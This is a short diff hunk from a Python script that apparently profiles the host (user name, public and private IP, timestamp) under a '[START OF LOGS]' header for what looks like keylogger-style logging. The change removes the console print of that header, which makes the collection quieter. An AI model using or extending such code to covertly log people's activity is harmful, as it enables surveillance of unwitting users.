@@ -17,7 +17,7 @@ user = os.path.expanduser('~').split('/')[2] # home directory splitting by '/' b
 datetime = time.ctime(time.time())
 
 msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
-print(msg)
+
 logged_data = []
 logged_data.append(msg)
 
